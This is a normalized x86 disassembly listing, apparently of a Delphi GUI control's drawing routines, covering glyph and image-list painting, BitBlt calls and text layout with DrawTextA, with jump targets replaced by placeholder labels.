mov eax [ rw-data ]
call sub_4334dc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov eax [ rw-data ]
call sub_403344
xor eax eax
mov [ rw-data ] eax
sub_4335d8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_4333b4
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_4334b8
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_43361c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_422bac
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_4335d8
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_43364c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4335d8
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_422bac
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_4336c4
mov eax 0x1
sub_4336c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_4335d8
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_43361c
sub_4336ec
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_433c9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412f04
mov eax [ ebp - 0xc ]
call sub_422ac0
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d9c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_422288
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412f04
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_433458
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4333e4
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_422ac0
push eax
mov eax [ ebp - 0xc ]
call sub_422ac0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41dc38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_433388
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_433388
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_433c5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403344
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_422ac0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d9c8
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_422b7c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_422ac0
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422ac0
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41dc38
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423890
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_422ac0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d9c8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422ac0
push eax
mov eax [ ebp - 0x14 ]
call sub_422ac0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41dc38
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41d9c8
mov eax [ ebp - 0x18 ]
call sub_41e234
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422ac0
call sub_41e234
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_422ac0
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41d9c8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422ac0
push eax
mov eax [ ebp - 0x14 ]
call sub_422ac0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41dc38
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41d9c8
mov eax [ ebp - 0x18 ]
call sub_41e234
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422ac0
call sub_41e234
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41cd14
push eax
mov eax [ ebp - 0x10 ]
call sub_422ac0
mov eax [ eax + 0x14 ]
pop edx
call sub_41d9c8
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422ac0
push eax
mov eax [ ebp - 0x14 ]
call sub_422ac0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41dc38
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d9c8
mov eax [ ebp - 0x18 ]
call sub_41e234
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422ac0
call sub_41e234
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423890
mov eax [ ebp - 0xc ]
call sub_422ac0
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41d9c8
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41dda0
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41d9c8
push 0x0
mov eax ebx
call sub_41e234
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41e234
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422ac0
call sub_41e234
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41e234
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41d9c8
push 0x0
mov eax ebx
call sub_41e234
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41e234
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422ac0
call sub_41e234
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41e234
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_422ac0
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41d1d4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423890
mov eax [ ebp - 0x14 ]
call sub_422ac0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d9c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403344
mov eax [ ebp - 0x14 ]
call sub_403344
retn
sub_433cc4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_4336ec
mov esi eax
call sub_436540
call sub_436620
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44f970
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41cd14
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_44f970
push eax
call ImageList_DrawEx
call sub_436540
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_436884
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_44f970
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41e234
push eax
call sub_436540
lea ecx [ ebp - 0x14 ]
pop edx
call sub_436770
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_433e28
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41dae4
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
mov eax ebx
call sub_41e234
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41d1d4
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
mov eax ebx
call sub_41e234
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41d1d4
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
mov eax ebx
call sub_41e234
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_433f08
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_412edc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412edc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_412edc
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412f04
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_412edc
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412f04
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404354
push eax
mov eax [ ebp + 0x20 ]
call sub_404554
push eax
mov eax [ ebp - 0x8 ]
call sub_41e234
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_412edc
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404354
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_412edc
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_412edc
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_412edc
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_436540
call sub_436620
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_434234
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_433f08
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_433cc4
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_433e28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_4342a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441294
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_4342c8
push ebx
mov ebx eax
mov eax ebx
call sub_44eb94
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434314
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_434344
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_434bf4
sub_434364
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_434c80
sub_434384
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4334e8
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_434bb4
mov ecx esi
xor edx edx
mov eax ebx
call sub_449fcc
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_44267c
mov edx 0xff00000f
mov eax ebx
call sub_4426f0
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_434444
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44a028
mov eax [ esi + 0x16c ]
call sub_403344
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43447c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_4348a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41e130
call sub_436540
call sub_436620
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412f04
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41e234
mov edx eax
mov eax esi
call sub_43f6a4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
